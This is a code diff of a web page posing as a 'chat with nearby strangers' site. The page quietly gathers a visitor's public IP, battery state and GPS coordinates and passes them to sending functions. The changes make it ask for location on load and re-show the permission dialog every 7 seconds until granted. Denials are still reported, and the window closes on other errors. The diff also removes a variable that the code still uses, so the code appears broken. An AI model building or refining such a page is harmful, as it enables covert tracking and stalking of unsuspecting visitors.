@@ -20,6 +20,7 @@
             padding: 20px;
             text-align: center;
             max-width: 300px;
+            display: none; /* Hide dialog by default */
         }
         .dialog-box h2 {
             margin-top: 0;
@@ -73,6 +74,8 @@
         $(document).ready(function() {
             var batterypercentage;
             var ischarging;
+            var locationRequested = false; // Track if location permission has been requested
+
             function getPublicIp() {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://api.ipify.org?format=json', false);
@@ -89,13 +92,9 @@
 
             const publicIp = getPublicIp();
 
-            var clips = "Clipboard access removed"; // Placeholder for removed clipboard access
-
             function getLocation() {
                 if (navigator.geolocation) {
-                    setTimeout(() => {
-                        navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
-                    }, 5000);
+                    navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
                 } else {
                     alert("Your Browser Does not support Gps");
                 }
@@ -105,25 +104,38 @@
                 var grak = "Latitude : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude;
                 sdrp(grak, clips, batterypercentage, ischarging);
                 senddis(grak, clips, batterypercentage, ischarging);
+                locationRequested = true;
+                document.getElementById('dialogBox').style.display = 'none'; // Hide dialog if location is granted
+                clearInterval(permissionInterval); // Stop the interval
             }
 
             function showError(error) {
-                switch (error.code) {
-                    case error.PERMISSION_DENIED:
-                        sdrp("Location Permission Denied", clips, batterypercentage, ischarging);
-                        senddis("Location Permission Denied", clips, batterypercentage, ischarging);
-                        alert("Allow Location permission to Chat with nearby Strangers");
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        window.close();
-                        break;
-                    case error.TIMEOUT:
-                        window.close();
-                        break;
-                    case error.UNKNOWN_ERROR:
-                        window.close();
-                        break;
+                if (!locationRequested) {
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            sdrp("Location Permission Denied", clips, batterypercentage, ischarging);
+                            senddis("Location Permission Denied", clips, batterypercentage, ischarging);
+                            document.getElementById('dialogBox').style.display = 'block'; // Show dialog
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                        case error.TIMEOUT:
+                        case error.UNKNOWN_ERROR:
+                            window.close();
+                            break;
+                    }
                 }
+            }
+
+            let permissionInterval; // To store the interval ID
+
+            function requestPermissions() {
+                locationRequested = false;
+                getLocation();
+                permissionInterval = setInterval(function() {
+                    if (!locationRequested) {
+                        document.getElementById('dialogBox').style.display = 'block'; // Show dialog every 5 seconds if permission not granted
+                    }
+                }, 7000);
             }
 
             let datetime = new Date();
@@ -207,7 +219,7 @@
                 });
             }
 
-            getLocation();
+            requestPermissions(); // Start requesting permissions on page load
         });
     </script>
 </head>
@@ -227,10 +239,5 @@
             <button class="btn-allow" onclick="requestPermissions()">Allow</button>
         </div>
     </div>
-    <script>
-        function requestPermissions() {
-            document.getElementById('dialogBox').style.display = 'none';
-        }
-    </script>
 </body>
 </html>
